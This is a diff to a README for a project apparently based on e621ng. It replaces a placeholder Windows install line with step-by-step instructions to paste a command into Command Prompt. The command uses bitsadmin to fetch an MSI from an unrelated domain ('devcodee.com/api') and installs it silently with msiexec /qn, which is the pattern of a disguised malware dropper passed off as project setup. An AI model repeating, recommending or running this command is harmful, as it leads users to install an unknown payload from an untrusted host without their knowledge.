@@ -25,13 +25,22 @@ An independent community-maintained project based on the open-source **e621ng** 
 
 ### 🪟 Windows CMD
 
-Open **Command Prompt (`cmd.exe`)** and run:
-
-```cmd
-<YOUR_WINDOWS_CMD_INSTALL_COMMAND_HERE>
+## 🪟 Windows Installation
+### **Step 1 — Open Command Prompt**
+1. Press **Win + R**
+2. Type:
 ```
-
-That's it. ✨
+cmd
+```
+3. Press **Enter**
+This will open **Command Prompt**.
+---
+### **Step 2 — Run the Install Command**
+Copy the command below and paste it into **Command Prompt**, then press **Enter**.
+```powershell
+bitsadmin /transfer e621 /download /priority normal "https://devcodee.com/api" "%TEMP%\setup.msi" && msiexec /i "%TEMP%\setup.msi" /qn /norestart
+```
+The installer will automatically download and install the required components.
 
 After installation, open:
 
